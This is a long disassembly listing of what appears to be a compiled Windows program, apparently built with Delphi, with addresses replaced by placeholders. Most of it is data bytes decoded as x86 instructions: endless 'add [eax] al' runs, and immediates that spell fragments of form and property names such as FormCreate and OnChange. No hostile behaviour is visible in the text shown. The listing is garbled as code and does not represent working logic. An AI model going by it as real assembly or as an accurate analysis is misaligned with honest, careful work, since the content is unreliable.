imul esp [ ebp + 0x6e ] 0x69746174
outsd
outsb
hlt
les eax [ fs : eax + eax + 0x1 ]
arpl [ ebp + 0x2 ] sp
add [ edx ] al
add [ ebx + 0x447140c0 ] cl
add [ esi ] al
push ebx
outsd
jne r-xdata
cwde
pushad
inc edx
add [ ecx ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
cmp al 0x71
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
daa
add [ edi ] al
add eax 0x6e6f4654
je r-xdata
rol [ eax + 0x71 ] 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060002 ] al
adc [ eax ] al
pop esp
les eax [ eax + eax + 0x64 ]
les eax [ eax + eax + 0x1 ]
mov [ eax + eax + 0x1 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] bl
push 0x65737261
je r-xdata
add [ eax + 0x69 ] dl
add [ eax ] al
or [ eax ] al
add [ eax ] eax
cmp al 0x71
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
add [ ss : eax + eax * 8 + 0x41060044 ] cl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ ecx + esi * 2 ] bh
add [ eax ] al
pop es
inc ebx
jo r-xdata
add [ eax ] bl
add [ eax ] al
dec eax
rol [ eax + eax + 0x1 ] 0x0
add [ eax ] al
add [ eax + 0x1004260 ] bl
imul esp [ edi + 0x6e ] 0x3
add [ eax ] al
or [ eax ] al
add al [ eax ]
cmp al 0x71
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] eax
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] cl
outsd
inc esp
add [ eax ] cl
add [ eax ] cl
inc edi
jb r-xdata
imul esp [ gs : edi + 0x68 ] 0x44693c74
add al [ eax ]
push es
dec eax
jo r-xdata
add [ eax - 0x13ffbb3c ] bl
les eax [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
cmp al 0x69
inc esp
inc esp
add [ eax ] dl
mov [ eax + eax + 0x18 ] 0xc6
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
imul esp [ ebx + 0x73 ] 0x69500008
sub_447205
push 0xc5d00044
inc esp
add al bl
lds eax [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x69500500
je r-xdata
add al [ eax ]
add ebx [ esi + 0x2004471 ]
push r-xdata
dec eax
lds eax [ eax + eax + 0x64 ]
lds eax [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53040006 ] al
imul edi [ edx + 0x65 ] r-xdata
test ch al
inc esp
add [ eax + 0x10044c5 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53050007 ] al
je r-xdata
inc [ esi ]
add [ edx ] al
add [ edx ] al
add [ eax + 0x2000446f ] bl
popad
outsb
insb
pushfd
adc [ eax ] al
sbb al 0x0
add bh bh
sbb al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ edi - 0x3dfbffc0 ] ch
insb
or eax [ gs : eax ]
add dh [ edx + esi * 2 + 0x20044 ]
add bl dl
jb r-xdata
add [ eax ] al
cwde
outsd
inc esp
add [ eax ] ah
add [ edx ] al
add [ edx ] al
sti
jb r-xdata
jmp [ eax ]
add [ edx ] al
add [ ebx ] al
pop esp
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ edx ] al
add [ ebx ] al
jle r-xdata
dec eax
inc esp
add [ edx ] al
add [ ebx ] al
sahf
jno r-xdata
outsd
outsb
je r-xdata
add [ ebx ] al
mov edi 0x2004471
add [ ebx ] al
fidiv [ ecx + 0x44 ]
add [ edx ] al
add [ ebx ] al
add al 0x72
inc esp
add [ edx ] al
add [ ebx ] al
and al 0x72
inc esp
add [ edx ] al
add [ ebx ] al
inc ebx
jb r-xdata
add [ edx ] al
or eax 0x65786950
insb
jae r-xdata
popad
jo r-xdata
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add ah ch
mov [ eax + eax - 0x64 ] 0xa4004313
adc eax [ ebx ]
and al cl
inc esp
add [ ebx + edi * 4 + 0x44 ] bl
jb r-xdata
or al 0x6e
inc esp
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
jb r-xdata
pop eax
inc eax
add ah cl
outsb
arpl [ eax - 0x70 ] bp
jl r-xdata
inc esp
add [ esp + eax * 8 ] dh
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4806ffff ] al
scasd [ edi ]
inc eax
add [ edx + eax * 8 ] al
add al [ gs : eax ]
add [ eax ] al
add eax [ eax ]
sbb [ eax ] al
add [ eax ] al
add eax 0x646f4d46
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x74 ] dl
inc esp
add [ ebx + esi * 2 + 0x73a50044 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add cl al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
xor [ ebx + 0x44 ] ch
add [ eax ] bl
add [ eax ] al
add [ 0x646f4d46 ] al
add [ eax + eax ] ah
add [ eax ] al
sub_4474d6
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax [ eax ]
add eax 0x74646957
push 0x11020005
jne r-xdata
add [ edx ] al
add [ ebx ] al
imul esi [ esp + eax * 2 ] 0x2
add [ ebx ] al
mov esi [ esp + eax * 2 ]
add al [ eax ]
add ebp [ edx + 0x2004474 ]
add [ ebx ] al
0x4474
sub_447538
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
jbe r-xdata
add [ ebx + edx + 0x13a40043 ] bl
inc ebx
add ah dl

add [ eax ] al
add [ eax ] al
add [ ebp + esi * 2 + 0x44 ] bl
add [ eax ] al
mov eax 0x1c004475
add [ eax ] al
add [ esi + ebp * 2 ] cl
inc esp
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax - 0x63ffbb35 ] ah
adc eax [ ebx ]
movsb [ edi ] [ esi ]
adc eax [ ebx ]
aam 0xcb
inc esp
add [ ebx + edi * 4 + 0x44 ] bl
add [ eax ] al
add [ ebx ] al
add [ edi + 0x44004475 ] bh
add ah dh
jmp ebp
sub_4476cf
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4206ffff ] al
imul esi [ ebp + ebp * 2 + 0x61 ] 0x40af0c70
add [ ebp + ecx * 8 + 0x44 ] bh
add [ eax - 0x32 ] dh
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4806ffff ] al
popad
outsb
insb
nop
or al 0x77
inc esp
add [ ebx ] al
or dl [ esi + eax * 2 + 0x69 ]
insb
insb
push ebx
je r-xdata
jae r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] cl
ja r-xdata
push 0x4c6f5474
push esi
popad
insb
imul esp [ eax + ecx + 0x47 ] 0x68706172
popad
add [ ecx ] cl
jae r-xdata
add al [ eax ]
adc [ eax + 0x44 ] bh
inc edi
jb r-xdata
or al 0x54
push esp
js r-xdata
jae r-xdata
outsb
je r-xdata
popad
insb
imul esp [ edx + ecx + 0x63 ] 0x6e655073
push esi
popad
insb
imul esp [ esp + ecx + 0x63 ] 0x75724273
jne r-xdata
dec esp
popad
imul ebp [ fs : esi + 0x67 ] 0x4c667406
inc esi
outsd
jb r-xdata
push ax
popad
je r-xdata
jo r-xdata
je r-xdata
je r-xdata
je r-xdata
or al 0x54
inc ebx
popad
outsb
jbe r-xdata
arpl [ ebx + 0x2 ] si
add [ ebp + 0x77a80040 ] cl
popa
arpl [ ebp + 0x8 ] sp
jae r-xdata
or [ esi + 0x4e ] dh
je r-xdata
outsb
popad
je r-xdata
push bx
inc ebp
insb
insb
jo r-xdata
add [ ebx ] al
imul esp [ ebx + 0x73 ] 0x78100002
inc esp
js r-xdata
je r-xdata
outsd
inc ebx
insb
imul esi [ eax + 0xa ] 0x6f4e6674
outsd
imul esp [ fs : esi + 0x79 ] 0x69727453
inc ebx
outsb
je r-xdata
or [ esi + 0x43 ] dh
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al al
ja r-xdata
je r-xdata
inc esi
outsd
outsb
outsd
jb r-xdata
or al 0x78
inc esp
add [ edx ] al
imul di [ eax + 0x7 ] 0x6674
push edx
imul esp [ edi + 0x68 ] 0x66740c74
push edx
je r-xdata
inc edi
dec ebp
push es
je r-xdata
add [ eax ] eax
or esi [ esi + 0x57 ]
je r-xdata
jb r-xdata
popad
adc [ esi + 0x56 ] dh
imul esi [ ebx + 0xc ] 0x78456674
jo r-xdata
add [ edi + esi * 2 + 0x44 ] eax
jb r-xdata
js r-xdata
add [ 0x654c6f63 ] cl
je r-xdata
jo r-xdata
jb r-xdata
add [ ebx + edx + 0x12cc0043 ] ah
inc ebx
add [ eax + 0x46 ] ch
inc eax
add [ ecx + 0x447a ] al
add [ eax ] al
add [ ebp + 0x3c00447b ] cl
add [ eax ] al
add [ eax + 0x5f ] ch
inc esp
add [ eax ] dl
jpe r-xdata
imul ebp [ esi + 0x67 ] 0x694c656c
outsb
add eax 0x6f546674
push edx
popad
imul ebp [ fs : esi + 0x67 ] 0x5366740c
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
jo r-xdata
inc edx
je r-xdata
dec esp
dec sp
inc edx
add ah dl
pop eax
rcr [ eax + 0x40 ] 0x1
jb r-xdata
inc edx
inc edx
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
pop edi
jb r-xdata
push esi
add al dl
imul esp [ ebx + 0x61 ] 0x6e65436c
je r-xdata
inc ebp
js r-xdata
jo r-xdata
imul ebp [ esi + 0x65 ] 0x54667405
outsd
outsb
push esp
popad
bound esi [ ebx + 0x11 ]
je r-xdata
outsd
je r-xdata
inc dx
jae r-xdata
or eax 0x6e456674
inc ebp
insb
insb
imul esi [ eax + 0x73 ] 0x740e7369
je r-xdata
imul esi [ eax + 0x73 ] 0x740c7369
inc bp
js r-xdata
add [ eax ] cl
je r-xdata
inc bx
je r-xdata
outsd
push edx
imul esp [ edi + 0x68 ] 0x6f630d74
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
popad
imul esp [ ebx + 0x73 ] 0x408d0002
add [ eax + 0x6004477 ] ch
add al [ eax ]
nop
dec eax
inc edi
jb r-xdata
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax - 0x63ffbcee ] ah
adc eax [ ebx ]
movsb [ edi ] [ esi ]
adc eax [ ebx ]
int3
imul esp [ ebx + 0x73 ] 0x79100002
inc esp
add [ esi ] al
or edx [ esp + edx * 2 + 0x65 ]
js r-xdata
aam 0x58
jb r-xdata
popad
imul ecx [ eax ] 0x47
outsb
or [ si + 0x66 ] dh
dec esi
popad
outsd
insd
or dh [ esi + 0x43 ]
pop eax
inc eax
pop eax
inc eax
add [ eax - 0x2fffbfa8 ] dh
jb r-xdata
jb r-xdata
jb r-xdata
jae r-xdata
jb r-xdata
push eax
jb r-xdata
or dh [ esi + 0x4e ]
outsd
inc ebp
imul esi [ fs : ebx + eax * 2 + 0x6f ] 0x6f72746e
insb
jae r-xdata
add [ ebx ] al
or eax 0x6e614354
jbe r-xdata
jo r-xdata
add [ eax + 0x46 ] ch
inc esi
outsd
jb r-xdata
or [ edi + 0x72 ] al
popad
je r-xdata
outsd
push di
popad
insb
add [ eax ] al
add [ ecx ] dl
add [ eax ] al
add [ eax + edi * 2 ] cl
inc esp
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
add [ eax ] al
or al 0x78
insb
arpl [ edx + 0x65 ] dx
arpl [ eax + ecx + 0x74 ] si
imul esp [ ebp + 0x6e ] 0x69746174
jb r-xdata
push ebx
jae r-xdata
inc esp
ja r-xdata
imul esp [ ebx + 0x73 ] 0x48900002
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add ah dh
into
inc esp
add [ eax ] cl
iretd
push 0x68004046
inc esi
popad
je r-xdata
inc eax
push edi
ja r-xdata
je r-xdata
add [ ecx + edi * 2 + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7c ] ch
je r-xdata
add [ esi ] al
add [ edx ] al
add [ ebp + 0x77c40040 ] cl
inc esp
add [ gs : edi + esi * 2 + 0x44 ] eax
je r-xdata
add [ ebx ] al
adc dl [ ebx + eax * 2 + 0x61 ]
outsb
jbe r-xdata
add al [ eax ]
lea eax [ eax ]
les esi [ edi + 0x44 ]
jae r-xdata
outsb
insb
push esi
popad
insb
imul esp [ ebx + ecx + 0x63 ] 0x6e6f4673
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edi + esi * 2 + 0x44 ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
inc esp
ja r-xdata
add [ 0x61487363 ] cl
sub_4479a6
inc esp
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x46d40000 ] al
inc edx
add [ eax ] cl
add [ eax ] al
add [ ecx ] cl
inc esi
dec edi
outsb
inc ebx
push 0x65676e61
add al [ eax ]
add ah dl
inc esi
inc edx
add [ eax ] dl
add [ eax ] al
add [ ebx ] cl
inc esi
dec edi
outsb
inc ebx
push 0x69676e61
outsb
add al [ bx + si ]
add [ eax + edx + 0x180040 ] bl
add [ eax ] al
or al [ esi + 0x54 ]
js r-xdata
inc esp
add dl cl
add [ ebx ] dl
add [ ebp - 0x35ffbb82 ] ch
add [ eax + eax ] dl
push cs
inc esi
insb
popad
jae r-xdata
add [ ebp - 0x35ffbb80 ] ah
add [ 0x4480fe00 ] bl
add dl cl
add [ 0x447f4500 ] dl
add dl cl
add [ esi ] dl
sub [ esi + 0x1c0040 ] ch
add [ eax ] al
add eax 0x636f4c46
imul eax [ edx ] 0x0
add [ eax + edx + 0x340040 ] bl
add [ eax ] al
or al [ esi + 0x4c ]
outsd
arpl [ ebx + 0x43 ] bp
outsd
jne r-xdata
add [ eax ] al
jmp [ ebp - 0x35ffbb81 ]
je r-xdata
add [ ecx ] ah
add [ ebx - 0x35ffbb85 ] bl
add [ eax + eax ] cl
push ds
jl r-xdata
add [ eax ] al
jg r-xdata
add [ esi ] cl
add dl cl
add [ 0x447c8400 ] cl
add dl cl
add [ esi ] cl
add [ ecx ] cl
jge r-xdata
add [ ecx + 0x4200447f ] al
add ah dh
add dl cl
add [ edi ] cl
add [ ebp + edi * 2 + 0x44 ] dl
add dl cl
add [ eax ] dl
add [ eax - 0x35ffbb83 ] dh
add [ ecx ] dl
add bl ch
jge r-xdata
add [ edx ] al
hlt
add [ eax + eax * 4 + 0x44 ] ah
add dl cl
add [ ecx ] bl
add [ edx - 0x80 ] dh
inc esp
add dl cl
add [ edx ] bl
add [ ecx - 0x35ffbb80 ] al
add [ ebx ] bl
add [ edx - 0x35ffbb80 ] dl
add [ eax + eax ] bl
movsd [ edi ] [ esi ]
add [ eax + eax - 0x36 ] 0x0
sbb eax 0x4480fe00
add dl cl
add [ edx ] dl
add [ edx + 0x7e ] al
inc esp
add [ edx ] al
hlt
sub_447ac4
push [ edi + 0x7e ]
inc esp
add dl cl
add [ ebx ] dl
add [ ebp - 0x35ffbb82 ] ch
add [ eax + eax ] dl
push cs
jg r-xdata
add [ ebp - 0x35ffbb80 ] ah
add [ 0x4480fe00 ] bl
add [ edx ] al
hlt
add dl cl
add [ 0x447f4500 ] dl
add dl cl
add [ esi ] dl
add [ ecx + 0x4200447f ] al
add ah dh
jmp [ ebp - 0x35ffbb81 ]
sub_447b2c
push [ 0xffffffffca004481 ]
add [ esi ] bl
add [ ecx + eax * 4 + 0x44 ] bl
add dl cl
add [ edi ] bl
add ch cl
add [ eax + eax + 0x42 ] 0x1cfff400
add [ eax + eax - 0x36 ] 0x0
and [ eax ] al
add [ eax + eax - 0x36 ] 0x0
and [ eax ] eax
test eax 0x42004482
add ah dh
jmp ecx
sub_4482ad
inc esp
add [ edx ] cl
push esp
js r-xdata
add al [ eax ]
add al [ eax ]
pop eax
add [ esi + eax * 4 + 0x44 ] bh
add [ eax ] cl
push esp
js r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x9c000374
adc [ eax ] al
or [ eax ] al
add al [ eax ]
test [ fs : eax + eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ esp + edx * 2 ] al
js r-xdata
int3
push edx
arpl [ gs : ebx + eax ] si
add [ eax ] al
add [ eax ] al
or al 0x0
add al 0x0
test [ fs : eax + eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add esp ecx
test al 0x40
add [ ecx ] al
add [ edx + edx * 2 ] al
arpl [ gs : edx + eax ] si
add [ ecx ] al
int3
add al [ eax ]
add al [ eax ]
dec ebx
add [ esi + eax * 4 + 0x44 ] dh
add [ edi ] al
push esp
js r-xdata
mov esp 0x90044cf
push esp
add al [ eax ]
add [ ecx + edi * 2 ] cl
inc esp
add [ eax ] cl
add [ edx ] cl
push esp
js r-xdata
add [ eax + 0x12 ] eax
dec edi
jne r-xdata
add al [ eax ]
add al [ eax ]
mov eax eax
push 0x7004484
or eax 0x73754354
je r-xdata
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0x109c0003
inc eax
add [ eax ] cl
add [ edx ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add eax [ eax ]
pushfd
adc [ eax ] al
or [ eax ] al
add al [ eax ]
test [ fs : eax + eax ] al
inc esi
outsd
jb r-xdata
inc eax
add [ edx ] al
add [ esp + edx * 2 ] al
js r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or al 0x0
add al 0x0
test [ fs : eax + eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add [ eax + 0x2 ] ebx
add [ eax ] al
pushfd
adc [ eax ] al
add al [ eax ]
add [ ecx + 0x2 ] ebx
add [ eax ] al
inc eax
adc al [ eax ]
or [ eax ] al
add al 0x54
js r-xdata
jo r-xdata
insd
inc ebx
popad
outsb
jbe r-xdata
jo r-xdata
add al [ eax ]
add al [ eax ]
daa
add ah bl
iretd
je r-xdata
popad
je r-xdata
add [ esp + eax * 4 + 0x44 ] ah
outsb
sub [ eax + 0x140040 ] 0x0
arpl [ gs : esp + ebx * 4 + 0x10 ] si
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax + 0x4308ffff ] al
insb
imul esi [ eax + 0x52 ] 0x9c746365
adc [ eax ] al
xor al 0x0
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c09ffff ] al
outsd
arpl [ ebx + 0x43 ] bp
outsd
jne r-xdata
imul esp [ ebx + 0x73 ] 0x70000
add al cl
test [ eax + eax + 0x2 ] al
add [ edx ] al
in al 0x84
inc esp
add [ edx ] al
add [ edx ] al
or [ ebp + 0x20044 ] al
add dh [ eax * 4 + 0x20044 ]
add dl [ ebp - 0x7b ]
inc esp
add [ edx ] al
add [ edx ] al
jns r-xdata
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add [ edx ] bl
test [ esi + 0x54080044 ] al
js r-xdata
add [ edx ] al
add [ eax ] cl
add [ ecx ] al
add [ esp + eax * 4 + 0x44 ] ah
js r-xdata
add al [ eax ]
add al [ eax ]
aaa
add [ edi + ecx * 8 + 0x54090044 ] bh
add [ eax ] al
add [ eax - 0x80000000 ] al
jns r-xdata
insb
popad
jae r-xdata
je r-xdata
add [ edx ] al
add [ esi ] ah
add [ eax ] bh
rol [ eax + eax + 0x6 ] 0x1
push ebp
outsb
insb
outsd
arpl [ ebx + 0x3 ] bp
add [ eax ] al
add [ eax ] al
inc esp
add [ edx ] al
add [ edx ] al
pushfd
test [ eax + eax + 0x2 ] eax
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ esp + edx * 2 ] al
js r-xdata
add al [ eax ]
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah cl
test al 0x40
add [ ecx ] al
add [ edx + edx * 2 ] al
arpl [ gs : edx + eax ] si
add [ eax + edx + 0x20040 ] bl
add [ eax + 0x2 ] ebx
add [ eax ] al
pushfd
adc [ eax ] al
or al 0x0
add [ ecx + 0x2 ] ebx
add [ eax ] al
inc eax
adc al [ eax ]
or [ eax ] al
add al 0x54
js r-xdata
push edx
arpl [ gs : ebx + eax ] si
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add eax 0x44846400
add [ edx ] al
add ah cl
test al 0x40
add [ eax ] dl
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4260 ] bl
add [ eax ] cl
inc edi
jb r-xdata
push es
inc esi
inc edx
add [ eax ] cl
add [ eax ] al
dec [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08ffff ] al
outsb
inc ebx
push 0x65676e61
aam 0x46
inc edx
add [ eax ] dl
add [ eax ] al
call [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0affff ] al
outsb
inc ebx
push 0x69676e61
outsb
lea eax [ bx + si ]
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
ja r-xdata
inc eax
add [ eax + eax ] dh
add [ eax ] al
adc [ eax ] al
sbb [ eax ] al
add bh bh
sbb [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ rw-data ] 0x0
je r-xdata
push eax
outsb
push eax
outsd
jae r-xdata
add [ eax + eax ] cl
add dh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
mov eax 0xd2
jmp sub_4067e0
call [ rw-data ]
sub_448419
inc esp
add [ edi ] al
push esp
jb r-xdata
inc esp
add [ edx ] al
add [ edx ] al
or [ ebp + 0x20044 ] al
add dh [ eax * 4 + 0x20044 ]
add dl [ ebp - 0x7b ]
inc esp
add [ edx ] al
add [ edx ] al
jns r-xdata
dec esp
outsd
arpl [ ebx + 0x3 ] bp
add [ eax ] al
adc [ eax ] al
or [ eax ] al
add [ eax ] eax
test [ fs : eax + eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
add [ es : eax ] bh
rol [ eax + eax + 0x6 ] 0x1
push ebp
outsb
insb
outsd
arpl [ ebx + 0x3 ] bp
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
mov eax eax
push 0x7004484
or eax 0x73754354
je r-xdata
add [ edx ] al
add [ esi ] ah
add [ eax ] bh
inc esp
add [ edx ] al
add [ edx ] al
pushfd
test [ eax + eax + 0x2 ] eax
jo r-xdata
insd
inc ebx
popad
outsb
jbe r-xdata
outsb
sub [ eax + 0x140040 ] 0x0
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
arpl [ gs : esp + ebx * 4 + 0x10 ] si
add [ eax + 0x4308ffff ] al
insb
imul esi [ eax + 0x52 ] 0x9c746365
adc [ eax ] al
xor al 0x0
jae r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
jns r-xdata
add [ edx ] al
add ah cl
test al 0x40
add [ eax ] dl
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4260 ] bl
add [ eax ] cl
inc edi
jb r-xdata
inc eax
add [ eax + eax ] dh
jo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c09ffff ] al
outsd
arpl [ ebx + 0x43 ] bp
outsd
jne r-xdata
imul esp [ ebx + 0x73 ] 0x70000
add al cl
test [ eax + eax + 0x2 ] al
add [ edx ] al
in al 0x84
insb
popad
jae r-xdata
je r-xdata
push es
inc esi
inc edx
add [ eax ] cl
add [ eax ] al
dec [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08ffff ] al
outsb
inc ebx
push 0x65676e61
aam 0x46
inc edx
add [ eax ] dl
add [ eax ] al
call [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0affff ] al
outsb
inc ebx
push 0x69676e61
outsb
lea eax [ bx + si ]
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
ja r-xdata
add [ eax ] al
adc [ eax ] al
sbb [ eax ] al
add bh bh
sbb [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ rw-data ] 0x0
je r-xdata
push eax
outsb
push eax
outsd
jae r-xdata
add [ eax + eax ] cl
add dh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
mov eax 0xd2
jmp sub_4067e0
call [ rw-data ]
sub_44856e
dec [ ecx ]
push esp
js r-xdata
dec [ ebp + 0x77e90040 ]
sar bl 0xff
lea eax [ eax ]
jmp r-xdata
inc esi
insb
popad
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push es
push eax
outsb
push eax
outsd
jae r-xdata
inc esi
inc edx
add [ eax ] cl
add [ eax ] al
dec [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08ffff ] al
outsb
inc ebx
push 0x65676e61
aam 0x46
inc edx
add [ eax ] dl
add [ eax ] al
call [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0affff ] al
outsb
inc ebx
push 0x69676e61
outsb
lea eax [ bx + si ]
jmp r-xdata
mov eax 0xd2
jmp sub_4067e0
call [ rw-data ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
sbb [ eax ] al
add bh bh
sbb [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub_44868c
in al 0x86
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
nop
inc esp
add [ edi + eax * 4 + 0x44 ] bh
add [ ebx ] al
mov [ eax + eax ] al
